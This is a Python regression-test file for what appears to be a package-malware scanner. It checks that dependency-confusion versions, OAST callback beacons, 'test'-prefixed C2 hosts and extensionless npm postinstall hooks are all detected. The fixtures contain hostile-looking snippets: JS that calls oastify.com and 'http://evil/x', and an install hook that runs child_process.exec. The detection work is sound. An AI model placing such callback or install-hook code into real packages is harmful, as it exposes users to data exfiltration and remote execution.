# SPDX-License-Identifier: AGPL-3.0-or-later
"""Regression guards for the static false-negative holes from the silent-loss sweep:
#5 (IOC whitelist over-matched any host starting "test") and #7 (extensionless
`node <file>` install hooks were never followed)."""
from __future__ import annotations

import json
import pathlib
import tempfile

import pathlib as _pl
import tempfile as _tf

from pkgsentry.analyze.iocs import _is_benign_url, _scan_file
from pkgsentry.analyze.metadata import _dependency_confusion_version
from pkgsentry.ecosystems.npm.installer import analyze_install_scripts


def test_high_major_dep_confusion_version_caught():
    # High major that isn't a calendar year — the corporate-front-vue@99.9.1 class.
    for v in ("99.9.1", "99.99.99", "100.0.0", "150.2.0"):
        assert _dependency_confusion_version(v) is True, v
    # Calendar versions and ordinary high majors must NOT fire.
    for v in ("2024.1.1", "2025.6.0", "22.0.0", "1.2.3"):
        assert _dependency_confusion_version(v) is False, v


def test_concatenated_oast_callback_caught():
    # String-built OAST URL the full-URL matcher misses, but the bare domain literal does.
    p = _pl.Path(_tf.mkdtemp()) / "test.js"
    p.write_bytes(b"const u='http://'+host+'.pkg.tok.oastify.com';require('https').get(u);")
    assert "iocs.oast_callback" in {f.rule_id for f in _scan_file(p)}
    # A full OAST URL must still produce exactly one oast finding (no double-fire).
    p2 = _pl.Path(_tf.mkdtemp()) / "x.js"
    p2.write_bytes(b"fetch('https://abc.oastify.com/beacon')")
    assert sum(f.rule_id == "iocs.oast_callback" for f in _scan_file(p2)) == 1


def test_test_prefixed_c2_host_is_not_whitelisted():
    # Real C2 on a host that merely STARTS with "test" must not be dropped.
    # (Avoid example/placeholder domains — those are whitelisted on purpose.)
    assert _is_benign_url(b"test-c2.b4dh0st.net/beacon") is False
    assert _is_benign_url(b"testbench.workers.dev/c") is False
    # Genuine test placeholders (whole host) stay whitelisted.
    assert _is_benign_url(b"testserver/x") is True
    assert _is_benign_url(b"test.com/x") is True
    assert _is_benign_url(b"test/x") is True


def test_extensionless_node_install_hook_is_followed():
    d = pathlib.Path(tempfile.mkdtemp()) / "pkg"
    d.mkdir()
    (d / "package.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install"}})
    )
    (d / "install.js").write_text(
        'require("https").get("http://evil/x"); require("child_process").exec("id");'
    )
    rules = {f.rule_id for f in analyze_install_scripts(d)}
    assert "installer.npm_install_script_net_exec" in rules, (
        "extensionless `node install` referenced JS must be scanned"
    )
